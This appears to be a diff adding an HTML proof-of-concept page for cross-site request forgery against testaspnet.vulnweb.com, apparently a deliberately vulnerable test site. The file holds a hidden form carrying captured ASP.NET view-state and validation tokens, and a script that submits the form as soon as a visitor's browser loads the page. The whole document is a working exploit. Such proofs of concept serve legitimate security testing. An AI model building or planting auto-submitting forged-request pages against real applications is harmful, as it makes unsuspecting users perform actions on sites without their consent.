@@ -1,0 +1,27 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF PoC</title>
+</head>
+<body>
+    <h1>CSRF Proof of Concept</h1>
+    <p>This form will automatically submit when the page loads:</p>
+    <form id="csrf-form" action="http://testaspnet.vulnweb.com/Comments.aspx?id=3" method="post">
+        <input type="hidden" name="__EVENTTARGET" value="">
+        <input type="hidden" name="__EVENTARGUMENT" value="">
+        <input type="hidden" name="__VIEWSTATE" value="/wEPDwUKLTg2MjcwMzE2Mg9kFgICAQ9kFggCAQ9kFgQCAQ8WBB4EaHJlZgUKbG9naW4uYXNweB4JaW5uZXJodG1sBQVsb2dpbmQCAw8WBB8AZB4HVmlzaWJsZWhkAgMPFgIfAQVJcG9zdGVkIGJ5IDxzdHJvbmc+YWRtaW4gICAgICAgICAgICAgICAgICAgIDwvc3Ryb25nPjExLzgvMjAwNSAxMTozNzozNSBBTWQCBQ8WBB8BBTFBY3VuZXRpeCBXZWIgVnVsbmVyYWJpbGl0eSBTY2FubmVyIGJldGEgcmVsZWFzZWQhHwAFElJlYWROZXdzLmFzcHg/aWQ9M2QCBw8WAh8BBagBMjYgSmFudWFyeSAyMDA1IC0gQSBiZXRhIHZlcnNpb24gb2YgQWN1bmV0aXggV2ViIFZ1bG5lcmFiaWxpdHkgU2Nhbm5lciBoYXMgYmVlbiByZWxlYXNlZCB0b2RheS4gVGhlIGJldGEgaXMgYXZhaWxhYmxlIGZvciBkb3dubG9hZCBhdCBodHRwOi8vd3d3LmFjdW5ldGl4LmNvbS9kb3dubG9hZC8uZGQzP/MHHnstJY/fWtD4cYSdoYkheQ==">
+        <input type="hidden" name="__VIEWSTATEGENERATOR" value="58A73C4D">
+        <input type="hidden" name="__EVENTVALIDATION" value="/wEWWQLj8dP9DwKAgcfvBQKFzrr8AQKbiraQAwL9kKSSBgKL+bPgBQKL+bPgBQKL+aeHDQKL+aeHDQKL+ZvsCwKL+ZvsCwKL+Y+DAwKL+Y+DAwK8k/vECQK8k/vECQK8k++bAQK8k++bAQK8k4O+CgK8k4O+CgK8k7fVAwK8k7fVAwK8k6voDAK8k6voDAK8k9+MBAK8k9+MBAK8k/OjDQK8k/OjDQK8k+fGBgK8k+fGBgK8k9uvAwK8k9uvAwK8k8/CDAK8k8/CDAKRutnrDwKRutnrDwKRus2OBwKRus2OBwKRuuElApG64SUCkbqV+AkCkbqV+AkCkbqJnwECkbqJnwECkbq9sgoCkbq9sgoCkbrR1gMCkbrR1gMCkbrF7QwCkbrF7QwCkbq51QkCkbq51QkCkbqt6AICkbqt6AIC1NnsngcC1NnsngcC1NmANQLU2YA1AtTZtMgJAtTZtMgJAtTZqO8CAtTZqO8CAtTZ3IMKAtTZ3IMKAtTZ8KYDAtTZ8KYDAtTZ5P0MAtTZ5P0MAtTZmJAEAtTZmJAEAtTZzPkCAtTZzPkCAtTZ4JwKAtTZ4JwKAqng8oUNAqng8oUNAqng5tgGAqng5tgGAqngmv8PAqngmv8PAqngjpIHAqngjpIHAqngoikCqeCiKQKp4NbNCQKp4NbNCQKp4MrgAgKp4MrgAgKp4P6HCgKp4P6HCvx8dHSf3vHlrdt8NRvOVFelZf8x">
+        <input type="hidden" name="tbComment" value="">
+        <input type="hidden" name="btnSend" value="Send comment">
+
+    </form>
+    <script>
+        // Auto-submit the form when the page loads
+        window.onload = function() {
+            document.getElementById("csrf-form").submit();
+        }
+    </script>
+</body>
+</html>
